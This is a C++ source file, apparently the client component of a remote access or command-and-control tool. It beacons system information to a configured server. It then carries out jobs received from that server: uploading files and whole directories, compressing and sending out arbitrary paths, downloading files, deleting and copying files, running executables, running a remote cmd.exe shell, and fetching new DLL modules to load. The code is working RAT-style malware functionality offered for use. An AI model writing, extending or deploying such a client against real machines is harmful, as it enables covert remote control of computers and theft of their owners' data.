// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE. 


#include "tcpNetworkManager.h"	/* Always use this header at the top */
#include "operations.h"
#include "json.h"
#include <iostream>
#include "utilities.h"
#include "base64.h"
#include <sstream>
#include <filesystem>
#include <fstream>
#include "systemInformation.h"
#include "stringUtil.h"


void httpService_t(SharedResourceManager &sharedResources) {
	const std::wstring sysInfo = sharedResources.getSysInfoInJson();
	const std::wstring serverUrl = sharedResources.getServerUrl();

	const std::string dataBase64 = base64_encode((unsigned char*)StringUtils::ws2s(sysInfo).c_str(), sysInfo.length());
	std::wstring request{ L"POST / HTTP/1.1\r\n"};
	request += L"Host: " + serverUrl + L"\r\n";
	request += L"Accept-Encoding: identity\r\n";
	request += L"User-Agent: clienthttp\r\n";
	request += L"Content-Type: application/octet-stream\r\n";
	request += L"Content-Length: " + std::to_wstring(dataBase64.length()) + L"\r\n";
	request += L"Connection: close\r\n";
	request += L"\r\n" + StringUtils::s2ws(dataBase64);

	struct timeval receiveResponse_timeout;
	receiveResponse_timeout.tv_sec = 0;
	receiveResponse_timeout.tv_usec = 500 * 1000;		// 500 miliseconds

	mysocket::WinSocket http;
	http.socket_init();

	const std::wstring host = serverUrl.substr(0, serverUrl.find(L':'));
	const std::wstring port = serverUrl.substr(serverUrl.find(L':') + 1);

	while (true) {
		std::wstring response;
		std::wstring receivedData;
		http.connect(host, port);
		if (sharedResources.isResponseAvailable()) {	// If there is some response which the client wants to send to the server
			response = sharedResources.popResponse();
			http.transmit(response, response.size());
		}
		else {
			http.transmit(request, request.size());		// else, send a generic alive-signal
		}
		http.receiveResponse(receivedData, receiveResponse_timeout);
		http.socket_close();							// Disconnect
		if (receivedData.empty()) { 
			continue;
		}					
		const size_t found = receivedData.find(L"\r\n\r\n");
		std::wstring replyFromServerInJson;
		if (found != std::string::npos) {
			std::string b64Data = extractBase64Data(receivedData.substr(found));
			replyFromServerInJson = StringUtils::s2ws(base64_decode(b64Data));
		}
		if (isJobAvailable(replyFromServerInJson)) {		// Found a job request from server ?
			sharedResources.pushJob(replyFromServerInJson);
			std::thread jobThread(startJob_t, std::ref(sharedResources));	// start a job thread
			jobThread.detach();
		}
	}
}

bool isJobAvailable(const std::wstring& replyFromServer) {
	std::wstring mode = JsonUtil::extractValue(replyFromServer, L"mode");
	if ((mode.empty() || mode == L"standard") ||
		(mode != L"uploadFile" &&
			mode != L"UploadDir" &&
			mode != L"downloadFile" &&
			mode != L"downloadDir" &&
			mode != L"execute" &&
			mode != L"listDir" &&
			mode != L"copy" &&
			mode != L"grabFile" &&
			mode != L"deleteFile" &&
			mode != L"compressAndDownload" &&
			mode != L"shell")) {
		return false;
	}
	return true;
}

void startJob_t(SharedResourceManager &sharedResources) {

	const std::wstring serverUrl = sharedResources.getServerUrl();
	std::wstring job{ sharedResources.popJob() };
	std::wstring request{ L"POST / HTTP/1.1\r\n" };
	request += L"Host: " + serverUrl + L"\r\n";
	request += L"Accept-Encoding: identity\r\n";
	request += L"User-Agent: clienthttp\r\n";
	request += L"Content-Type: application/octet-stream\r\n";
	std::wstring dataToSend;
	std::wstring mode{ JsonUtil::extractValue(job, L"mode") };
	std::error_code ec;
	std::wstring replyType{ L"log" };

	if (mode == L"downloadFile") {
		std::wstring filetransferDllPath{ getExecutableDir() + L"\\filetransfer.dll" };
		if (fs::exists(filetransferDllPath, ec)) {       // if filetransfer.dll exist
			std::wstring url{ JsonUtil::extractValue(job, L"url") };
			std::wstring port{ JsonUtil::extractValue(job, L"port") };
			std::wstring filePath{ JsonUtil::extractValue(job, L"filePath") };
			std::wstring destPath{ JsonUtil::extractValue(job, L"destPath") };
			filePath = ReplaceTildeWithPathWindows(filePath);
			destPath = ReplaceTildeWithPathWindows(destPath);
			std::wstring fileName;

			if (fs::is_directory(destPath, ec)) {
				const std::wstring tmpFileName{ L"fileXXXXxxxxx" };
				const std::wstring tmpFilePath = destPath + L"/" + tmpFileName;
				std::ofstream tmpFile(tmpFilePath);

				if (tmpFile.is_open()) {              // Check for write permissions on destination directory before downloading files to it
					tmpFile.close();
					fs::remove(tmpFilePath, ec);    // Remove the temporary created file            
					fileName = filePath.substr(filePath.find_last_of('/') + 1);
					url += L":" + port + L"/" + filePath;
					std::wstring errorMsg;
					HINSTANCE handle_filetransferLib = LoadLibrary(L"filetransfer.dll");
					if (!handle_filetransferLib) {
						dataToSend = L"Failed to load filetransfer.dll";
					}
					else if (DownloadFileFromURLViaDll(handle_filetransferLib, url, destPath, errorMsg)) {
						dataToSend = fileName + L" downloaded successfully to " + destPath;
					}
					else {
						dataToSend = fileName + L" didn't downloaded";
						dataToSend += L" | errorMsg: " + errorMsg;
					}
					FreeLibrary(handle_filetransferLib);
				}
				else {                       // Destination directory doesn't have write permissions
					dataToSend = destPath + L" doesn't have write permissions";
				}
			}
			else {
				dataToSend = destPath + L" doesn't exists";
			}
		}
		else {
			replyType = L"resourceRequired";
			dataToSend = L"executeCommands.dll";
		}
	}
	else if (mode == L"uploadFile") {
		std::wstring filetransferDllPath{ getExecutableDir() + L"\\filetransfer.dll" };
		if (fs::exists(filetransferDllPath, ec)) {
			std::wstring url{ JsonUtil::extractValue(job, L"url") };
			std::wstring port{ JsonUtil::extractValue(job, L"port") };
			std::wstring filePath{ JsonUtil::extractValue(job, L"filePath") };

			filePath = ReplaceTildeWithPathWindows(filePath);
			const std::wstring fileName{ filePath.substr(filePath.find_last_of('/') + 1) };
			if (fs::is_regular_file(filePath, ec)) {
				url += L":" + port;
				std::wstring errorMsg;
				HINSTANCE handle_filetransferLib = LoadLibrary(L"filetransfer.dll");
				if (!handle_filetransferLib) {
					dataToSend = L"Failed to load filetransfer.dll";
				}
				else if (UploadFileToURLViaDll(handle_filetransferLib, url, filePath, errorMsg)) {
					dataToSend = filePath + L" uploaded successfully";
				}
				else {
					dataToSend = filePath + L" DID NOT get uploaded!";
					dataToSend += L" | errorMsg: " + errorMsg;
				}
				FreeLibrary(handle_filetransferLib);
			}
			else {
				dataToSend = filePath + L" doesn't exists";
			}
		}
		else {
			replyType = L"resourceRequired";
			dataToSend = L"filetransfer.dll";
		}
	}
	else if (mode == L"UploadDir") {
		std::wstring filetransferDllPath{ getExecutableDir() + L"\\filetransfer.dll" };
		if (fs::exists(filetransferDllPath, ec)) {       // if filetransfer.dll exist
			std::wstring url{ JsonUtil::extractValue(job, L"url") };
			std::wstring port{ JsonUtil::extractValue(job, L"port") };
			std::wstring dirPath{ JsonUtil::extractValue(job, L"dirPath") };
			std::wstring fileExtensions{ JsonUtil::extractValue(job, L"fileExtensions") };
			dirPath = ReplaceTildeWithPathWindows(dirPath);

			if (!fs::is_directory(dirPath, ec)) {       // check whether it is a directory
				dataToSend = dirPath + L" is not a directory!";
			}
			else if (fs::is_empty(dirPath, ec)) {      // check whether the directory is empty
				dataToSend = dirPath + L"is empty";
			}
			else {                                      // for valid directory path
				url += L":" + port;
				std::wstring errorMsg;
				HINSTANCE handle_filetransferLib = LoadLibrary(L"filetransfer.dll");
				if (!handle_filetransferLib) {
					dataToSend = L"Failed to load filetransfer.dll";
				}
				else if (UploadDirectoryToURLViaDll(handle_filetransferLib, url, dirPath, errorMsg, fileExtensions)) {
					dataToSend = dirPath + L"/ directory uploaded successfully";
				}
				else {
					dataToSend = dirPath + L"/ directory DID NOT get uploaded!";
					dataToSend += L" | errorMsg: " + errorMsg;
				}
				FreeLibrary(handle_filetransferLib);
			}
		}
		else {                          // if filetransfer.dll DOES NOT exist, inform CRC about it
			replyType = L"resourceRequired";
			dataToSend = L"filetransfer.dll";
		}
	}
	else if (mode == L"deleteFile") {
		std::wstring filePath{ JsonUtil::extractValue(job, L"filePath") };
		if (filePath.empty()) {
			dataToSend = L"Couldn't delete: filePath is empty!";
		}
		if (fs::is_directory(filePath, ec)) {
			dataToSend = L"Couldn't delete: " + filePath + L" is a directory!";
		}
		else {
			filePath = ReplaceTildeWithPathWindows(filePath);
			if (fs::exists(filePath, ec)) {
				if (fs::remove(filePath, ec)) {
					dataToSend = filePath + L" deleted successfully";
				}
				else {
					dataToSend = L"Unable to deleted " + filePath + L" std::error_code = " + std::to_wstring(ec.value());;
				}
			}
			else {
				dataToSend = filePath + L" does not exist!";
			}
		}
	}
	else if (mode == L"listDir") {
		std::wstring dirToList = JsonUtil::extractValue(job, L"dirToList");
		std::wstring dirInfo{ L"{\"files\":[" };		
		if (dirToList.empty()) {
			// Default is home directory, also try to find the home directory of user with another method if not found here
			dirToList = L"C:/users/" + SysInformation::getUserName();
		}
		dirToList = ReplaceTildeWithPathWindows(dirToList);
		if (!(StringUtils::endsWith(dirToList, L"\\") || StringUtils::endsWith(dirToList, L"/"))) {
			dirToList += L"/";
		}
		if (!fs::is_directory(dirToList, ec)) {         // Is this a Directory ?
			dataToSend = dirToList + L" is not a directory";
		}
		else if (fs::is_empty(dirToList, ec)) {        // Is Directory Empty ?
			dataToSend = dirToList + L" is empty!";
		}
		else {                                        // This is NOT an EMPTY Directory, continue here
			std::wstring filemanagerDllPath{ getExecutableDir() + L"\\filemanager.dll" };
			if (fs::exists(filemanagerDllPath, ec)) {
				std::wstring errorMsg;
				HMODULE hFilemanagerLib = LoadLibrary(L"filemanager.dll");
				if (hFilemanagerLib == NULL) {
					dataToSend = L"Failed to load filemanager.dll";
				}
				else {
					dataToSend = filemanagerViaDll(hFilemanagerLib, dirToList);
				}
				FreeLibrary(hFilemanagerLib);
				replyType = L"dirList";
			}
			else {
				replyType = L"resourceRequired";
				dataToSend = L"filemanager.dll";
			}
		}	
	}
	else if (mode == L"copy") {
		const std::wstring sourcePath{ JsonUtil::extractValue(job, L"sourcePath") };
		const std::wstring destPath{ JsonUtil::extractValue(job, L"destPath") };

		if (sourcePath.empty() || destPath.empty()) {
			dataToSend = L"Either source or destination is empty!";
		}
		else if (!fs::is_directory(destPath, ec)) {           // Verify that the destination is a directory
			dataToSend = destPath + L" is not a directory!";
		}
		else {                                                  // Destination is a directory   
			if (fs::is_directory(sourcePath, ec)) {           // Copy directory
				const std::wstring Dirname{ ExtractLastDirectoryName(sourcePath) };   // Extract directory name from sourcePath
				if (fs::exists(destPath + L"/" + Dirname, ec)) {    // if directory to be copied already exist at destination
					dataToSend = sourcePath + L" already exist in the " + destPath;
				}
				else {
					const auto copyOptions = fs::copy_options::skip_symlinks |
						fs::copy_options::recursive;
					fs::copy(sourcePath, destPath + L"/" + Dirname, copyOptions, ec);
					if (ec) { dataToSend = mode + L" " + StringUtils::s2ws(ec.message()); }
					else { dataToSend = sourcePath + L" is copied to " + destPath + L" successfully"; }
				}
			}
			else {                                          // Copy file
				const std::wstring filename{ sourcePath.substr(sourcePath.find_last_of('/') + 1) };   // Extract file name from the sourcePath
				if (fs::exists(destPath + L"/" + filename, ec)) {  // if file to be copied already exist at destination
					dataToSend = destPath + L"/" + filename + L" already exist in the " + destPath;
				}
				else {
					const auto copyOptions = fs::copy_options::skip_symlinks | fs::copy_options::skip_existing;
					fs::copy_file(sourcePath, destPath + L"/" + filename, copyOptions, ec);
					if (ec) { dataToSend = mode + L" " + StringUtils::s2ws(ec.message()); }
					else { dataToSend = sourcePath + L" is copied to " + destPath + L" successfully"; }
				}
			}
		}
	}
	else if (mode == L"execute") {
		std::wstring executeCommandsDllPath{ getExecutableDir() + L"\\executeCommands.dll" };
		if (fs::exists(executeCommandsDllPath, ec)) {
			std::wstring exePath{ JsonUtil::extractValue(job, L"exePath") };
			std::wstring arguments{ JsonUtil::extractValue(job, L"exeArguments") };

			exePath = ReplaceTildeWithPathWindows(exePath);
			arguments = ReplaceTildeWithPathWindows(arguments);

			if (!fs::exists(exePath, ec)) {
				dataToSend = exePath + L" does not exist";
			}
			else if (isExecutable(exePath)) {
				std::wstring errorMsg;
				HMODULE hExecLib = LoadLibrary(TEXT("executeCommands.dll"));
				if (hExecLib == NULL) {
					dataToSend = L"Failed to load executeCommands.dll";
				}
				else {
					dataToSend = executeCommandViaDll(hExecLib, exePath, arguments);
				}
				FreeLibrary(hExecLib);
			}
			else { dataToSend = exePath + L" is not executable"; }
		}
		else {
			replyType = L"resourceRequired";
			dataToSend = L"executeCommands.dll";
		}
	}
	else if (mode == L"compressAndDownload") {
		std::wstring url = JsonUtil::extractValue(job, L"url");
		std::wstring port = JsonUtil::extractValue(job, L"port");
		url += L":" + port;
		const std::wstring path = JsonUtil::extractValue(job, L"path");

		std::wstring archivePath = path;
		if ((archivePath.back() == L'/') || (archivePath.back() == L'\\')) {
			archivePath.pop_back();
		}
		std::wstring filename = extractFilename(path);
		if (filename.empty()) {
			filename = ExtractLastDirectoryName(path);
		}
		std::wstring command;
		std::wstring args;
		std::wstring compressionUtilityPath;
		std::wstring compressionUtility = findCompressionUtility(compressionUtilityPath);
		std::wstring destinationPath;

		if (compressionUtility.empty()) {
			dataToSend = L"Couldn't found Compress-Archive, WinRAR or 7zip utility on this system";
		}
		if (compressionUtility == L"Compress-Archive") {
			command = L"powershell";
			// For directory --> Compress-Archive -Path "path/to/dir" -DestinationPath "archivePath.zip"
			destinationPath = fs::temp_directory_path().wstring() + filename + L".zip";
			args = L"Compress-Archive -Path \"" + path + L"\" -DestinationPath \"" + destinationPath + L"\"";
		}
		else if (compressionUtility == L"WinRAR") {
			destinationPath = fs::temp_directory_path().wstring() + filename + L".rar";
			// "C:\program files\WinRAR\Rar.exe" a -m5 -r -ep1 -idq -y "path/to/temp/filename.rar" "path/to/fileOrDir"
			command = L"\"" + compressionUtilityPath + L"\\Rar.exe\" ";
			if(fs::is_directory(path))
				args = L"a -r -m5 -idq -y -ep1 \"" + destinationPath + L"\" \"" + path + L"\"";
			else
				args = L"a -m5 -idq -y -ep1 \"" + destinationPath + L"\" \"" + path + L"\"";
		}
		else if (compressionUtility == L"7-Zip") {
			destinationPath = fs::temp_directory_path().wstring() + filename + L".7z";
			// "C:\program files\WinRAR\Rar.exe" a -m5 -r -ep1 -idq -y "path/to/temp/filename.7z" "path/to/fileOrDir"
			command = L"\"" + compressionUtilityPath + L"\\7z.exe\" ";
			args = L"a -t7z -m0=LZMA2 -mx= -y -aoa \"" + destinationPath + L"\" \"" + path + L"\"";
		}

		HMODULE hExecLib = LoadLibrary(TEXT("executeCommands.dll"));
		if (hExecLib == NULL) {
			dataToSend = L"Failed to load DLL.";
		}
		else{
			dataToSend += executeCommandViaDll(hExecLib, command, args) + L" ";
		}
		FreeLibrary(hExecLib);
		std::wstring errorMsg;
		HINSTANCE handle_filetransferLib = LoadLibrary(L"filetransfer.dll");
		if (!handle_filetransferLib) {
			dataToSend = L"Failed to load filetransfer.dll";
		}
		else if (UploadFileToURLViaDll(handle_filetransferLib, url, destinationPath, errorMsg)) {
			dataToSend = destinationPath + L" uploaded successfully";
		}
		else { dataToSend = destinationPath + L" didn't get uploaded, error msg: " + errorMsg; }
		if (!fs::remove(destinationPath, ec)) {
			dataToSend = fs::temp_directory_path().wstring() + filename + L" NOT deleted: " + StringUtils::s2ws(ec.message());
		}
		FreeLibrary(handle_filetransferLib);
	}
	else if (mode == L"shell") {
		std::wstring executeCommandsDllPath{ getExecutableDir() + L"\\executeCommands.dll" };
		if (fs::exists(executeCommandsDllPath, ec)) {
			//    std::wstring exePath = { L"cmd.exe /c " + JsonUtil::extractValue(job, L"exePath") };
			std::wstring exePath = { L"cmd.exe /c " + JsonUtil::extractValue(job, L"command") };
			std::wstring arguments{ JsonUtil::extractValue(job, L"arguments") };
			std::wstring cd{ JsonUtil::extractValue(job, L"cd") };
			exePath = ReplaceTildeWithPathWindows(exePath);
			arguments = ReplaceTildeWithPathWindows(arguments);
			cd = ReplaceTildeWithPathWindows(cd);
			static fs::path currentPath = fs::current_path();
			if (!(cd.empty())) {
				std::wstring newDir = changeDir(cd, ec);
				if (newDir.empty()) {
					dataToSend = currentPath;
				}
				else {
					dataToSend = newDir;
					currentPath = newDir;
				}
			}
			else {
				exePath = L"cmd.exe /c cd " + currentPath.wstring() + L" && " + exePath;
				HMODULE hExecLib = LoadLibrary(TEXT("executeCommands.dll"));
				if (hExecLib == NULL) {
					dataToSend = L"Failed to load DLL.";
				}
				else {
					dataToSend = executeCommandViaDll(hExecLib, exePath, arguments).substr(exePath.length());
				}
				FreeLibrary(hExecLib);
			}
			replyType = L"shellResponse";
		}
		else {
			replyType = L"resourceRequired";
			dataToSend = L"executeCommands.dll";
		}
	}
	else if (mode == L"grabFile") {
		std::string filename{ StringUtils::ws2s(JsonUtil::extractValue(job, L"filename")) };
		std::string base64Data{ StringUtils::ws2s(JsonUtil::extractValue(job, L"base64Data")) };
		std::string fileContent = base64_decode(base64Data.c_str());
		std::wstring pathToResource{ getExecutableDir() + L"\\" + StringUtils::s2ws(filename) };

		if (fs::exists(pathToResource, ec) && fs::file_size(pathToResource, ec) == fileContent.length()) {
			dataToSend = StringUtils::s2ws(filename) + L" already exist!";
		}
		else if (!writeFileContents(StringUtils::ws2s(pathToResource), fileContent)) {
			dataToSend = L"couldn't write " + StringUtils::s2ws(filename);
		}
		else {
			dataToSend = StringUtils::s2ws(filename + " is succesfully fetched by client");
		}
	}

	const std::wstring sysInfo = sharedResources.getSysInfoInJson();
	dataToSend = JsonUtil::appendKeyValue(sysInfo, replyType, dataToSend);
	std::string dataToSendStr = StringUtils::ws2s(dataToSend); // Convert wstring to string   
	dataToSend = StringUtils::s2ws(base64_encode((unsigned char*)dataToSendStr.c_str(), dataToSendStr.length()));

	std::wstringstream contentLengthStream;
	contentLengthStream << dataToSend.length();
	request += L"Content-Length: " + contentLengthStream.str() + L"\r\n";
	request += L"Connection: close\r\n";
	request += L"\r\n" + dataToSend;
	sharedResources.pushResponse(request);
	request.clear();
}